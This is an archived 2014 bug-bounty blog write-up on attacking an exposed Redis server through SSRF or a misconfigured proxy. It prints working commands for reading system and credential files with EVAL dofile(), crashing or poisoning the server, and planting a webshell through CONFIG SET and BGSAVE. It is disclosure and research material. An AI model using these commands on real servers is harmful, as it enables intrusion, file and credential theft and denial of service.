---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2014-09-11_trying-to-hack-redis-via-http-requests.md
original_filename: 2014-09-11_trying-to-hack-redis-via-http-requests.md
title: Trying to hack Redis via HTTP requests
category: documents
detected_topics:
- command-injection
- ssrf
- otp
- automation-abuse
- cors
- api-security
tags:
- imported
- documents
- command-injection
- ssrf
- otp
- automation-abuse
- cors
- api-security
language: en
raw_sha256: 8ab811f3fc807cd3de2cba511ca0ebed7045176b1e057792d540ac0ecf976fb2
text_sha256: 9e6370e1124105b79e22a9bc3af4618f5c5786e75f40f94f613e410b22b5bc98
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: true
---

# Trying to hack Redis via HTTP requests

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2014-09-11_trying-to-hack-redis-via-http-requests.md
- Source Type: markdown
- Detected Topics: command-injection, ssrf, otp, automation-abuse, cors, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: True
- Raw SHA256: `8ab811f3fc807cd3de2cba511ca0ebed7045176b1e057792d540ac0ecf976fb2`
- Text SHA256: `9e6370e1124105b79e22a9bc3af4618f5c5786e75f40f94f613e410b22b5bc98`


## Content

---
title: "Trying to hack Redis via HTTP requests"
page_title: "Trying to hack Redis via HTTP requests | Agarri : Sécurité informatique offensive"
url: "https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html"
final_url: "https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html"
authors: ["Nicolas Grégoire (@Agarri_FR)"]
programs: ["Meta / Facebook"]
bugs: ["SSRF", "CRLF injection", "RCE"]
bounty: "20,000"
publication_date: "2014-09-11"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 6365
---

* [Home](/en/index.html "Home page")
  * [Company](/en/company.html "Company details")
  * [Publications](/en/publications.html "Public interventions and published vulnerabilities")
  * [Trainings](/en/trainings.html "Burp Suite Pro training")
  * [Blog](/blog/ "Technical analysis and personnal opinions")
  * [ ![fr](/images/fr.png)](/fr/ "French version")

[Main](https://www.agarri.fr/blog/index.html) > [Archives](https://www.agarri.fr/blog/archives/index.html) > [2014](https://www.agarri.fr/blog/archives/2014/index.html) > [09](https://www.agarri.fr/blog/archives/2014/09/index.html) >  
[<](https://www.agarri.fr/blog/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html) 10:35:56 [>](https://www.agarri.fr/blog/archives/2014/10/15/bypassing_blacklists_based_on_ipy/index.html)

##  jeudi 11 septembre 2014, 10:35:56 (UTC+0200) 

### Trying to hack Redis via HTTP requests

  * Context

Imagine than you can access a Redis server via HTTP requests. It could be because of a SSRF vulnerability or a misconfigured proxy. In both situations, all you need is to fully control at least one line of the request. Which is pretty common in these scenarios ;-) Of course, the CLI client 'redis-cli' does not support HTTP proxying and we will need to forge our commands ourself, encapsulated in valid HTTP requests and sent via the proxy. Everything was tested under [version 2.6.0](http://code.google.com/p/redis/downloads/detail?name=redis-2.6.0.tar.gz). It's old, but that's what the target was using...

  

  * Redis 101

[Redis](http://redis.io/) is NoSQL database, which stores everything in RAM as key/value pairs. By default, a text-oriented interface is reachable on port TCP/6379 without authentication. All you need to know right now is that the interface is very forgiving and will try to parse every provided input (until a timeout or the 'QUIT' command). It may only quietly complain via messages like "-ERR unknown command".

  

  * Target identification

When exploiting a SSRF vulnerability or a misconfigured proxy, the first task is usually to scan for known services. As an attacker, I look for services bound to loopback only, using source-based authentication or just plain insecure "because they are not reachable from the outside". And I was quite happy to see these strings in my logs:
  
  
  -ERR wrong number of arguments for 'get' command
  -ERR unknown command 'Host:'
  -ERR unknown command 'Accept:'
  -ERR unknown command 'Accept-Encoding:'
  -ERR unknown command 'Via:'
  -ERR unknown command 'Cache-Control:'
  -ERR unknown command 'Connection:'
  

As you can see, the HTTP verb 'GET' is also a [valid](http://redis.io/commands/GET) Redis command, but the number of arguments do not match. And given no HTTP headers match a existing Redis command, there's a lot of "unknown command" error messages. 

  

  * Basic interaction

In my context, the requests were nearly fully controlled by myself and then emitted via a Squid proxy. That means that 1) the HTTP requests must be valid, in order to be processed by the proxy 2) the final requests reaching the Redis database may be somewhat normalized by the proxy. The easy way was to use the POST body, but injecting into HTTP headers was also a valid option. Now, just send a few basic commands (in blue): 
  
  
  ECHO HELLO
  $5
  HELLO
  
  TIME
  *2
  $10
  1410273409
  $6
  380112
  
  CONFIG GET pidfile
  *2
  $7
  pidfile
  $18
  /var/run/redis.pid
  
  SET my_key my_value
  +OK
  
  GET my_key
  $8
  my_value
  
  QUIT
  +OK
  

  

  * We need spaces!

As you may have already noted, the server responds with the expected data, plus some strings like "*2" and "$7". This the binary-safe version of the [Redis protocol](http://redis.io/topics/protocol), and it is needed if you want to use a parameter including spaces. For example, the command 'SET my key "foo bar"' will never work, with or without single/double quotes. Luckily, the binary-safe version is quite straightforward:  
\- everything is separated with new lines (here CRLF)  
\- a command starts with '*' and the number of arguments ("*1" + CRLF)  
\- then we have the arguments, one by one:  
\- string: the '$' character + the string size ("$4" + CRLF) + the string value ("TIME" + CRLF)  
\- integer: the ':' character + the integer in ASCII (":42" + CRLF)  
\- and that's all!

  

Let's see an example, comparing the CLI client and the venerable 'netcat': 
  
  
  $ redis-cli -h 127.0.0.1 -p 6379 set with_space 'I am boring'
  +OK
  
  
  
  $ echo '*3\r\n$3\r\nSET\r\n$10\r\nwith_space\r\n$11\r\nI am boring\r\n' | nc -n -q 1 127.0.0.1 6379 
  +OK
  

  

  * Reconnaissance

Now that we can easily discuss with the server, a recon phase is needed. A few Redis commands are helpful, like "INFO" and "CONFIG GET (dir|dbfilename|logfile|pidfile)". Here's the ouput of "INFO" on my test machine: 
  
  
  # Server
  redis_version:2.6.0
  redis_git_sha1:00000000
  redis_git_dirty:0
  redis_mode:standalone
  os:Linux 3.2.0-61-generic-pae i686
  arch_bits:32
  multiplexing_api:epoll
  gcc_version:4.6.3
  process_id:19114
  run_id:***REDACTED-SUSPECT-TOKEN***  tcp_port:6379
  uptime_in_seconds:9806
  uptime_in_days:0
  lru_clock:518932
  
  # Clients
  connected_clients:1
  client_longest_output_list:0
  client_biggest_input_buf:1
  blocked_clients:0
  
  # Memory
  used_memory:661768
  [...]
  

The next step is, of course, the file-system. Redis can execute Lua scripts (in a sandbox, more on that later) via the "EVAL" command. The sandbox allows the [dofile()](http://luatut.com/dofile.html) command (WHY???). It can be used to enumerate files and directories. No specific privilege is needed by Redis, so requesting /etc/shadow should give a "permission denied" error message:
  
  
  EVAL dofile('/etc/passwd') 0
  -ERR Error running script (call to f_afdc51b5f9e34eced5fae459fc1d856af181aaf1): /etc/passwd=***REDACTED*** function arguments expected near ':' 
  
  EVAL dofile('/etc/shadow') 0
  -ERR Error running script (call to f_9882e931901da86df9ae164705931dde018552cb): cannot open /etc/shadow: Permission denied
  
  EVAL dofile('/var/www/') 0
  -ERR Error running script (call to f_8313d384df3ee98ed965706f61fc28dcffe81f23): cannot read /var/www/: Is a directory
  
  EVAL dofile('/var/www/tmp_upload/') 0
  -ERR Error running script (call to f_7acae0314580c07e65af001d53ccab85b9ad73b1): cannot open /var/www/tmp_upload/: No such file or directory
  
  EVAL dofile('/home/ubuntu/.bashrc') 0
  -ERR Error running script (call to f_274aea5728cae2627f7aac34e466835e7ec570d2): /home/ubuntu/.bashrc:2: unexpected symbol near '#'
  

If the Lua script is syntaxically invalid or attempts to set global variables, the error messages will leak some content of the target file: 
  
  
  EVAL dofile('/etc/issue') 0
  -ERR Error running script (call to f_8a4872e08ffe0c2c5eda1751de819afe587ef07a): /etc/issue:1: malformed number near '12.04.4'
  
  EVAL dofile('/etc/lsb-release') 0
  -ERR Error running script (call to f_d486d29ccf27cca592a28676eba9fa49c0a02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable 'Ubuntu'
  
  EVAL dofile('/etc/hosts') 0
  -ERR Error running script (call to f_1c25ec3da3cade16a36d3873a44663df284f4f57): /etc/hosts:1: malformed number near '127.0.0.1'
  

Another scenario, probably not very common, is calling dofile() on valid Lua files and returning the variables defined there. Here's a hypothetic file /var/data/app/db.conf: 
  
  
  db = {
  login  = 'john.doe',
  passwd=***REDACTED***,
  }
  

And a small Lua script dumping the password=***REDACTED*** dofile('/var/data/app/db.conf');return(db.passwd); 0 
  +OK Uber31337
  

It works on some standard Unix files too: 
  
  
  EVAL dofile('/etc/environment');return(PATH); 0  
  +OK /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
  
  EVAL dofile('/home/ubuntu/.selected_editor');return(SELECTED_EDITOR); 0
  +OK /usr/bin/nano
  

  

  * CPU theft

Redis provides redis.sha1hex(), which can be called from Lua scripts. So you can offload your SHA-1 cracking to open Redis servers. The code by [@adam_baldwin](https://twitter.com/adam_baldwin) is on [GitHub](https://github.com/evilpacket/redis-sha-crack) and the slides on [Slideshare](http://fr.slideshare.net/evilpacket/ev1lsha-misadventures-in-the-land-of-lua). 

  

  * DoS

There's a lot of ways to DoS an open Redis instance, from deleting the data to calling the [SHUTDOWN](http://redis.io/commands/SHUTDOWN) command. However, here's two funny ones:  
\- calling dofile() without any parameter will read a Lua script from STDIN, which is the Redis console. So the server is still running but will not process new connections until "^D" is hit in the console (or a restart)  
\- sha1hex() can be overwritten (not only for you, but for every client). Using a static value is one of the options 

  

The Lua script: 
  
  
  print(redis.sha1hex('secret'))
  function redis.sha1hex (x)
  print('4242424242424242424242424242424242424242') 
  end
  print(redis.sha1hex('secret'))
  

On the Redis console: 
  
  
  # First run
  ***REDACTED-SUSPECT-TOKEN***  ***REDACTED-SUSPECT-TOKEN***  # Next runs
  ***REDACTED-SUSPECT-TOKEN***  ***REDACTED-SUSPECT-TOKEN***  * Data theft

If the Redis server happens to store interesting data (like session cookies or business data), you can enumerate stored pairs using [KEYS](http://redis.io/commands/KEYS) and then read their values with [GET](http://redis.io/commands/GET). 

  

  * Crypto

Lua scripts use fully predictable "random" numbers! Loot at evalGenericCommand() in scripting.c for details: 
  
  
  /* We want the same PRNG sequence at every call so that our PRNG is
  * not affected by external state. */
  redisSrand48(0);
  

Every Lua script calling math.random() will get the same stream of numbers: 
  
  
  0.17082803611217
  0.74990198051087
  0.09637165539729
  0.87046522734243
  0.57730350670279
  [...]
  

  * RCE

In order to get remote code execution on an open Redis server, three scenarios were considered. The first one (proven but [highly complex](https://gist.github.com/corsix/6575486)) is related to byte-code modification and abuse of the internal VM machine. Not my cup of tea, I'm not a binary guy. The second one is escaping the globals protection and trying to access interesting functions (like during a CTF-like Python escape). Escaping the globals protection is trivial (and documented on [StackOverflow](http://stackoverflow.com/questions/19997647/script-attempted-to-create-global-variable)!). However, no interesting module is loaded at all, or my Lua skills suck (which is probable). By the way, there's plenty of interesting stuff [here](http://lua-users.org/wiki/SandBoxes). 

  

Let's consider the third scenario, easy and realistic: dumping a semi-controlled file to disk, for example under the Web root and gain RCE through a webshell. Or overwriting a shell script. The only difference is the target filename and the payload, but the methodology is identical. It should be noted that the location of the log file can not be modified after startup. So the only solution is the database file itself. If you are paying attention enough, you should find suprising that a RAM-only database writes to disk. In fact, the database is copied to disk from times to times, for recovery purposes. The backup occurs depending on the configured thresholds, or when the [BGSAVE](http://redis.io/commands/bgsave) command is called. 

The actions to take in order to drop a semi-controlled file are the followings:  
  
\- modify the location of the dump file  
CONFIG SET dir /var/www/uploads/  
CONFIG SET dbfilename sh.php  
  
\- insert your payload in the database  
SET payload "could be php or shell or whatever"  
  
\- dump the database to disk  
BGSAVE  
  
\- restore everything  
DEL payload  
CONFIG SET dir /var/redis/  
CONFIG SET dbfilename dump.rdb  

  

And then, it's a big FAIL. Redis sets the mode of the dump file to "0600" (aka "-rw-------"). So Apache will not able to read it :-( 

  * Outro

Even if I wasn't able to execute my own code on this server, researching Redis was fun. And I learned a few tricks, which may be useful next week or later, you never know. Finally, thanks to people who published on Redis security: Francis Alexander, Peter Cawley and Adam Baldwin. And to the Facebook security team, which awarded 20K$ for a misconfigured proxy (the Redis instance was running on "noc.parse.com"). 

  
Posted by Nicolas Grégoire | [Permanent link](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)

/\

###  webmaster@agarri.fr  
Copyright 2010-2021 Agarri
